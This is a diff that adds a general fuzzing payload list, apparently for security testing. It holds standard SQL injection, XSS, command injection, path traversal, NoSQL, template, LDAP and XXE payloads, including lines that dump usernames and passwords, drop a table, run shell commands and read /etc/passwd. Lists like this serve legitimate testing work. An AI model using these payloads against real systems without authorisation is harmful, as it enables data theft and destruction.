@@ -1,0 +1,58 @@
+# General Parameter Fuzzing Payloads
+# Common payloads for testing various injection points
+
+# SQL Injection
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL--
+' UNION SELECT username,password FROM users--
+'; DROP TABLE users--
+
+# XSS
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+javascript:alert('XSS')
+<svg onload=alert('XSS')>
+
+# Command Injection
+; ls -la
+| whoami
+`id`
+$(whoami)
+& ping -c 1 127.0.0.1
+
+# Path Traversal
+../../../etc/passwd
+..\..\..\windows\system32\drivers\etc\hosts
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+
+# NoSQL Injection
+{"$gt": ""}
+{"$ne": null}
+{"$where": "1==1"}
+
+# Template Injection
+{{7*7}}
+${7*7}
+#{7*7}
+
+# LDAP Injection
+*)(uid=*))(|(uid=*
+admin)(&(password=*)
+*))%00
+
+# XML Injection
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+# Special Characters
+< > & " '
+null
+undefined
+NaN
+true
+false
+0
+-1
+999999999 
